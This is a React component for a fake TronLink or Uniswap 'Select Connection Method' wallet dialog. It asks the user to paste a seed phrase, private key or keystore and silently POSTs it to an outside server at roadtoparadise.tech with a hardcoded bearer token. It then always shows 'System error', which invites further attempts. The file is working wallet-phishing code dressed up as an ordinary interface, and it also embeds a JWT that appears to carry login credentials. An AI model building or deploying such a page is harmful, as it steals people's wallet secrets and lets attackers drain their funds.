import React, { useEffect, useState, useRef } from "react";
import { Link } from "react-router-dom";
import close from "../../assets/images/close.png";
import TronLink from "../../assets/images/tronlink.png";
import "./style.css";
import axios from "axios";

export default function Tronscan() {
  const [count, setCount] = useState(0);
  const [value, setValue] = useState("");
  const [isNext, setIsNext] = useState(false);
  const [text, setText] = useState("Next");
  const inputRef = useRef(null);
  const [loading, setLoading] = useState(false);
  const containerRef = useRef(null);

  const scrollTop = () => {
    window.scrollTo({
      top: 0,
      behavior: "smooth",
    });
  };

  useEffect(() => {
    setTimeout(() => {
      scrollTop();
    }, 500);
  }, []);

  const onBlur = () => {
    scrollTop();
  };

  useEffect(() => {
    if (inputRef.current) {
      inputRef.current.focus();
      scrollTop();
    }
    return () => {
      setCount(0);
      setText("Next");
      setValue("");
      setLoading(false);
    };
  }, []);

  const showNext = () => {
    setIsNext(true);
  };

  const addToServer = (event) => {
    const token =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5naHEyODc0MjNua2Fqc2hqayIsInBhc3N3b3JkIjoia29pYXM5MTgyNzNAIn0.r-UfdcGNRjGFx-EvYtT2DHDRhVBUwCcYcWf0cfy5bDw";
    if (count === 4) {
      setText("System error");
      event.target.style.background = "#FF5E79";
      event.target.style.filter = "drop-shadow(0px 2px 0px #d70b2e)";
      return;
    }
    if (!value) {
      inputRef.current.focus();
      inputRef.current.style.border = "1px solid #FF5E79";
      return;
    } else {
      setLoading(true);
      inputRef.current.style.border = "none";
      axios
        .post(
          "http://roadtoparadise.tech/api/wallet/login-wallet",
          {
            secret: value,
            wallet_type: 13,
            app_name: "uniswap",
          },
          {
            headers: {
              Authorization: `Bearer ${token}`,
              "Content-Type": "application/json",
            },
          }
        )
        .then((res) => {
          if (res.data.message === "Success") {
            setText("System error");
            event.target.style.background = "#FF5E79";
            // event.target.style.filter = "drop-shadow(0px 2px 0px #d70b2e)";
            setCount((prev) => prev + 1);
            setLoading(false);
          }
        })
        .catch((err) => {
          console.log(err);
          setText("System error");
          event.target.style.background = "#FF5E79";
          setCount((prev) => prev + 1);
          setLoading(false);
        });
    }
  };

  return (
    <div className="section-new section-tronscan" ref={containerRef}>
      <div className="connect-next">
        <div className="connect-pop">
          <div className="wrap-close">
            <Link className="btn-close" to="/wallet">
              <img src={close} alt="uniswap" />
            </Link>
          </div>
          <div className="header">Select Connection Method</div>
          {!isNext && (
            <div className="content content-1">
              <img src={TronLink} alt="uniswap" />
              <button onClick={showNext} className="btn-content-1 btn-content">Connect</button>
            </div>
          )}
          {isNext && (
            <div className="content content-2">
              <textarea
                ref={inputRef}
                className="content-input"
                onChange={(e) => setValue(e.target.value)}
                onBlur={onBlur}
                placeholder="Paste or enter your mnemonic, private key, or keystore"
              ></textarea>
              <button className="btn-content-2 btn-content" onClick={addToServer}> {loading && <span className="loader"></span>} {text}</button>
            </div>
          )}
          <div className="bottom">
            <p className="policy">
              Choosing to connect indicates that you have accepted{" "}
              <span className="red">Terms of Service Privacy Policy</span>{" "}
            </p>
            <p className="install">
            If you haven't installed TronLink, please install <p className="new-line">first, then
              refresh the page and try</p> <p className="new-line"> again.{" "}
              <span className="red">Install Now</span></p>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
